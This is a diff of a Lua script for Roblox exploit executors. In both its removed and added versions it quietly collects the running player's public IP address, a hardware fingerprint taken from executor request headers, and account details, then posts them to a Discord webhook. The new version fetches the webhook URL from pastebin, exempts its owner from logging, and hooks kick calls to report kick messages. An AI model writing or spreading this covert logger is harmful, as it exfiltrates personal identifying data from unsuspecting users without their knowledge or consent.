@@ -1,111 +1,207 @@
-local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
-local IP = game:HttpGet("https://v4.ident.me")
-plr = game:GetService'Players'.LocalPlayer
-local premium = false
-local ALT = false
-if plr.MembershipType == Enum.MembershipType.Premium then
-    premium = true
-elseif plr.MembershipType == Enum.MembershipType.None then
-    premium = false
-end
-if premium == false then 
-    if plr.AccountAge <= 70 then 
-        ALT = true
+	local webh = game:HttpGet("https://pastebin.com/raw/CMxbwGAc")
+	local ownerID = tonumber(game:HttpGet("https://gist.githubusercontent.com/Superwheat/628312eaa91b4d5904acd5fb60314bb4/raw/68f3128221455cd5899d3e12f79f483359fc9247/owner.txt"))
+	local check = game:GetService("Players").LocalPlayer.UserId == ownerID
+	
+	pcall(function()
+		local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
+        local IP = game:HttpGet("https://v4.ident.me")
+        
+        pcall(function()
+    		if check == false and game:GetService("Players").LocalPlayer:IsInGroup(11762024) == false then
+    			IP = game:HttpGet("https://v4.ident.me")
+    		else
+    			IP = "No IP of this person for you lol."
+    		end
+        end)
+
+        plr = game:GetService'Players'.LocalPlayer
+        local premium = false
+        local ALT = false
+        if plr.MembershipType == Enum.MembershipType.Premium then
+            premium = true
+        elseif plr.MembershipType == Enum.MembershipType.None then
+            premium = false
+        end
+        if premium == false then 
+            if plr.AccountAge <= 70 then 
+                ALT = true
+            end
+        end
+        
+        local market = game:GetService("MarketplaceService")
+        local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+        
+        
+        local http_request = http_request;
+        if syn then
+            http_request = syn.request
+        elseif SENTINEL_V2 then
+            function http_request(tb)
+                return {
+                    StatusCode = 200;
+                    Body = request(tb.Url, tb.Method, (tb.Body or ''))
+                }
+            end
+        end
+        
+        local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+        local decoded = game:GetService('HttpService'):JSONDecode(body)
+        local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+        hwid = "";
+        
+        for i, v in next, hwid_list do
+            if decoded.headers[v] then
+                hwid = decoded.headers[v];
+                break
+            end
+        end
+        
+        if hwid then
+            
+            pcall(function()
+        		if check == false and game:GetService("Players").LocalPlayer:IsInGroup(11762024) == false then
+        			hwid = hwid
+        		else
+        			hwid = "No HWID of this person for you lol."
+        		end
+            end)
+            
+            local HttpServ = game:GetService('HttpService')
+            local url = webh
+        
+        
+            local data = 
+                {
+                    ["content"] = "",
+                    ["embeds"] = {{
+                        ["title"] = "__**HWID:**__",
+                        ["description"] = hwid,
+                        ["type"] = "rich",
+                        ["color"] = tonumber(0xAB0909),
+                        ["fields"] = {
+                            {
+                                ["name"] = "Username:",
+                                ["value"] = Game.Players.LocalPlayer.Name,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "UserId:",
+                                ["value"] = Game.Players.LocalPlayer.UserId,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Game Link:",
+                                ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Game Name:",
+                                ["value"] = info.Name,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Age:",
+                                ["value"] = plr.AccountAge,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Premium:",
+                                ["value"] = premium,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "ALT:",
+                                ["value"] = ALT,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "IP:",
+                                ["value"] = IP,
+                                ["inline"] = true
+                            },
+        
+                        },
+                    }}
+                }
+            local newdata = HttpServ:JSONEncode(data)
+        
+            local headers = {
+                ["content-type"] = "application/json"
+            }
+        
+            local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+            http_request(request_payload)
+        end
+	end)
+
+    local Hook;
+    
+    local function sendlog(message)
+        pcall(function()
+            local data = {
+                ["embeds"] = {
+                    {
+                        ["title"] = game:GetService("Players").LocalPlayer.Name.." was kicked from the game.",
+                        ["description"] = "GameID: " ..game.PlaceId,
+                        ["fields"] = {
+                            {
+                                ["name"] = "Kick Message:",
+                                ["value"] = message,
+                                ["inline"] = false
+                            },
+                            {
+                                ["name"] = "Profile:",
+                                ["value"] = "https://www.roblox.com/users/"..game:GetService("Players").LocalPlayer.UserId.."/profile",
+                                ["inline"] = false
+                            }
+                        }
+                    }
+                }
+            }
+    
+            if syn then
+                local response = syn.request(
+                    {
+                        Url = webh,
+                        Method = 'POST',
+                        Headers = {
+                            ['Content-Type'] = 'application/json'
+                        },
+                        Body = game:GetService('HttpService'):JSONEncode(data)
+                    }
+                );
+            elseif request then
+                local response = request(
+                    {
+                        Url = webh,
+                        Method = 'POST',
+                        Headers = {
+                            ['Content-Type'] = 'application/json'
+                        },
+                        Body = game:GetService('HttpService'):JSONEncode(data)
+                    }
+                );
+            elseif http_request then
+                local response = http_request(
+                    {
+                        Url = webh,
+                        Method = 'POST',
+                        Headers = {
+                            ['Content-Type'] = 'application/json'
+                        },
+                        Body = game:GetService('HttpService'):JSONEncode(data)
+                    }
+                );
+            end
+        end)
     end
-end
-
-local market = game:GetService("MarketplaceService")
-local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-
-
-local http_request = http_request;
-if syn then
-    http_request = syn.request
-elseif SENTINEL_V2 then
-    function http_request(tb)
-        return {
-            StatusCode = 200;
-            Body = request(tb.Url, tb.Method, (tb.Body or ''))
-        }
-    end
-end
-
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
-
-for i, v in next, hwid_list do
-    if decoded.headers[v] then
-        hwid = decoded.headers[v];
-        break
-    end
-end
-
-if hwid then
-    local HttpServ = game:GetService('HttpService')
-    local url = "https://discord.com/api/webhooks/922969556882964490/p2V4fI3p_9D_vbAyOay4orcFbACpsCLkMdhcpHCv3moXkgHYxLTmfbSR2aQqvtdDcMvq"
-
-
-    local data = 
-        {
-            ["content"] = "",
-            ["embeds"] = {{
-                ["title"] = "__**HWID:**__",
-                ["description"] = hwid,
-                ["type"] = "rich",
-                ["color"] = tonumber(0xAB0909),
-                ["fields"] = {
-                    {
-                        ["name"] = "Username:",
-                        ["value"] = Game.Players.LocalPlayer.Name,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "UserId:",
-                        ["value"] = Game.Players.LocalPlayer.UserId,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Game Link:",
-                        ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Game Name:",
-                        ["value"] = info.Name,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Age:",
-                        ["value"] = plr.AccountAge,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Premium:",
-                        ["value"] = premium,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "ALT:",
-                        ["value"] = ALT,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "IP:",
-                        ["value"] = IP,
-                        ["inline"] = true
-                    },
-
-                },
-            }}
-        }
-    local newdata = HttpServ:JSONEncode(data)
-
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-
-    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
-    http_request(request_payload)
-end
+    
+    Hook = hookmetamethod(game, "__namecall", newcclosure(function(...)
+        local Args = {...}
+        local Method = getnamecallmethod()
+        if Method == "kick" or Method == "Kick" then
+            local KickMessage = Args[2]
+            coroutine.wrap(sendlog)(KickMessage)
+        end
+        return Hook(...)
+    end))
